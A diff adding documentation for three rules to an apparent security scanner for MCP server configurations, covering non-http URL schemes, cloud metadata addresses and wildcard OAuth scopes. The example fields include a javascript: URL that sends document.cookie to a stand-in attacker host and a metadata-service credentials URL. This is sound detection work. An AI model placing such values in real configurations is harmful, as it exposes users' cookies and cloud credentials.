@@ -260,6 +260,43 @@ DOCS: dict[str, RuleDoc] = {
                    "that honestly documents its egress is quiet. Confidence is 0.6; treat "
                    "it as a prompt to read the schema, not a verdict.",
     ),
+    "MCPA023": RuleDoc(
+        what="A configured server URL whose scheme is not http, https, ws or wss -- in "
+             "particular `javascript:`, `data:`, `file:` or `vbscript:`.",
+        why="The protocol's own security guidance says a client \"MUST only allow http:// "
+            "and https:// schemes\" and \"MUST reject javascript:, data:, file:, "
+            "vbscript:, and other potentially dangerous schemes\". A client that opens a "
+            "javascript: URL hands its author execution inside the client, and where the "
+            "client shells out to open URLs that becomes command execution on the host.",
+        example='"url": "javascript:fetch(\'//attacker/\' + document.cookie)"',
+        fix="Remove it. An MCP endpoint is http:// or https://; anything else is not a "
+            "transport, it is a payload.",
+    ),
+    "MCPA024": RuleDoc(
+        what="A server URL pointing at a cloud instance metadata service or any link-local "
+             "address: 169.254.169.254, metadata.google.internal, 169.254.170.2, or the "
+             "169.254.0.0/16 range generally.",
+        why="The metadata service returns IAM credentials and instance secrets to anything "
+            "that can reach it, with no authentication. It is the classic SSRF target, and "
+            "the MCP security guidance calls out link-local addresses by name.",
+        example='"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
+        fix="Remove the server. This is not an endpoint that serves MCP -- configuring it "
+            "asks the agent to fetch cloud credentials and return them as tool output.",
+        wrong_when="Effectively never. Nothing legitimate runs an MCP server on the "
+                   "metadata address, which is why this scores critical with no hedging.",
+    ),
+    "MCPA025": RuleDoc(
+        what="An OAuth scope in the server's configuration that is a wildcard or an omnibus "
+             "grant: `*`, `all`, `full-access`, `admin`, or anything ending `:*`.",
+        why="A stolen broad token gives an attacker every capability at once, and revoking "
+            "it breaks every workflow rather than one. The security guidance lists wildcard "
+            "and omnibus scopes as a named mistake.",
+        example='"url": "https://api.example.com/mcp", "scopes": ["*", "admin"]',
+        fix="Request the narrowest scopes the server actually needs, and let it ask for more "
+            "when it first needs them.",
+        wrong_when="Some providers genuinely name a scope `admin` for a narrow "
+                   "administrative capability. Check what it grants before suppressing.",
+    ),
 }
 
 
